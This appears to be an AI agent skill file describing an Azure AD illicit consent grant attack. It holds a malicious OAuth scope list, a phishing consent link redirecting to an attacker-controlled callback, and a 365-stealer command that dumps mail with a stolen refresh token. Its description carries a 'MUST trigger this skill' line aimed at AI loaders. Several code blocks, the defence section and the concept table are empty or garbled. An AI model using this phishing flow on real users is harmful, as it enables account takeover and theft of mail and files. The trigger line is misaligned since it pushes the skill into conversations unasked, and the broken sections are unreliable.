---
name: azure-ad-illicit-consent-grant
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Exploit Illicit Consent Grants in Azure Active Directory (Entra ID). This skill covers 
  crafting a malicious OAuth application to trick victims into granting broad permissions 
  (like reading emails, modifying files) without requiring their password or MFA.
domain: cybersecurity
subdomain: penetration-testing
category: Cloud Security
difficulty: intermediate
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0001, TA0005, TA0009]
  techniques: [T1528]
platforms: [azure, cloud]
tags: [azure, entra-id, oauth, illicit-consent, phishing, cloud-pentesting]
tools: [azure-cli, burp-suite, 365-stealer]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Azure AD Illicit Consent Grant Attack

## When to Use
- When conducting cloud-focused Red Team engagements where standard credential phishing is blocked by strong Multi-Factor Authentication (MFA).
- To maintain stealthy, persistent access to a user's Microsoft 365 data (emails, OneDrive) by relying on OAuth refresh tokens rather than stolen passwords.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Registering the Malicious Application

```bash
# ```

### Phase 2: Defining Scopes and Permissions

```json
// // {
  "requestedPermissions": [
    { "id": "Mail.ReadWrite", "type": "Scope" },
    { "id": "Files.ReadWrite.All", "type": "Scope" },
    { "id": "User.Read", "type": "Scope" }
  ]
}
```

### Phase 3: Crafting the Consent Link (The Phish)

```http
# # https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
client_id=ATTACKER_APP_ID
&response_type=code
&redirect_uri=https://attacker-controlled-site.com/callback
&response_mode=query
&scope=Mail.ReadWrite%20Files.ReadWrite.All%20User.Read%20offline_access
&state=12345
```

### Phase 4: Harvesting the Tokens and Accessing Data

```bash
# python3 365-stealer.py --refresh-token [STOLEN_REFRESH_TOKEN] --dump-mail
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Send Phishing Link ] --> B{User Consents? ]}
    B -->|Yes| C[Receive Auth Code ]
    B -->|No| D[Revise Pretext ]
    C --> E[Exchange for Token ]
```

## 🔵 Blue Team Detection & Defense
- **Restrict App Consent**: - **Monitor Azure AD Audit Logs**: **Defend against Oauth Phishing**: Key Concepts
| Concept | Description |
|---------|-------------|
| OAuth Consent Flow | |
| Illicit Consent | |


## Output Format
```
Azure Ad Illicit Consent Grant — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)
> The Architect Mindset identifies misconfigurations spanning multiple domains.
- Chain info-leaks with SSRF/RCE.
- Maintain absolute OPSEC during active engagement.

## 🏁 Execution Phase (Steps to Reproduce)
1. Perform target reconnaissance.
2. Formulate payload based on endpoints.
3. Execute the exploit and capture exfiltrated data.

**Severity Profile:** High (CVSS: 8.5)

## References
- Microsoft: [Detect and Remediate Illicit Consent Grants](https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/detect-and-remediate-illicit-consent-grants)
- O365 Stealer: [GitHub Repository](https://github.com/AlteredSecurity/365-Stealer)
